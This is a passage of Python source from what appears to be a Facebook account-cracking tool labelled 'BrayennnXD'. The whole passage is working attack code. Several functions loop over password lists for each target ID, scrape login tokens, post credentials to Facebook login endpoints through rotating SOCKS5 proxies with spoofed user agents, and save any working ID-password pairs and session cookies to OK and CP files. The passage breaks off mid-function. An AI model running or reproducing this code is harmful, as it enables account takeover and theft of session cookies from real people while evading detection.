	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Reguler V2[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
def reguler3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Reguler V3[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'free.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://free.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://free.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Async[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE ALPHA ]--------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
